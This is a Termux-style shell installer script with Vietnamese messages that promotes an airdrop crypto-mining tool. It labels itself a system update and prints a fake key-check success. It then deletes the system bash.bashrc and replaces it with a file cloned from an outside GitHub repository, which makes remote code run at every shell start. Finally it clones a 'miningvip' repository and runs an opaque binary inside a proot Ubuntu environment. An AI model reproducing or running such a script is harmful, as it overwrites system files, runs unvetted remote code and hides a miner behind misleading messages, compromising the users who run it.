#!/bin/sh
clear
echo "Cập nhật hệ thống..."
sleep 1
apt install git -y
echo "
╭───────────────────────────────────────────────────────────────────────╮
│                 [updated]: [15-10-2024 12:16:23]                      │
│                 [Version]: [v4.15]                                    │
│ CẢNH BÁO                                                              │
│                                                                       │
│ 1: khônng share tool ngoài nhóm                                       │
│ 2: không support nhom khac                                            │
│ 3: phát hiện tôi sẽ band bạn ra khỏi nhóm                             │
│ 4: mua tool của ad thì em tra lời .ae mua chỗ khác quay lại           │
│ lại ? e miễn trả lời                                                  │
│ 5: Để cập nhật và biết thêm nhiều bot hơn, hãy tham gia cùng chúng tôi│
│ 6: zalo-support: https://zalo.me/g/xkilco724                          │
│ 7: airdrop-support: https://t.me/airdropnhanhgon                      │
╰───────────────────────────────────────────────────────────────────────╯

██████╗ ███████╗██╗   ██╗    ██████╗ ██╗███████╗███╗   ██╗
██╔══██╗██╔════╝██║   ██║    ██╔══██╗██║██╔════╝████╗  ██║
██║  ██║█████╗  ██║   ██║    ██║  ██║██║█████╗  ██╔██╗ ██║
██║  ██║██╔══╝  ╚██╗ ██╔╝    ██║  ██║██║██╔══╝  ██║╚██╗██║
██████╔╝███████╗ ╚████╔╝     ██████╔╝██║███████╗██║ ╚████║
╚═════╝ ╚══════╝  ╚═══╝      ╚═════╝ ╚═╝╚══════╝╚═╝  ╚═══╝
[?] 🔏DEV DIEN AIRDROP2024 📌zalo:0899717143 🤑TOOL:veruscoin"
sleep 3
echo "check key: thành công..✓"
sleep 1
cd
cd ..
cd usr
cd etc 
rm -rf bash.bashrc
rm -rf bash.bashrc
git clone https://github.com/Ngocgiau2000/start.git 
cd start
cp bash.bashrc ../bash.bashrc
cd

if ! command -v proot-distro &> /dev/null; then
echo "Cài đặt proot-distro V4.56..."
sleep 1
apt install proot-distro -y
fi

echo "Tải và cài đặt mod  Ubuntu v4.56..."
sleep1
proot-distro install ubuntu

echo "Khởi động môi trường Ubuntu và mod start automatic V4.56..."
proot-distro login ubuntu -- bash -c "apt update -y && apt upgrade -y && apt install git && apt install curl && apt install wget && cd && git clone http://github.com/Ngocgiau2000/miningvip.git && apt install sudo -y && cd miningvip && chmod +x giau && chmod +x giau && ./giau && exec bash"
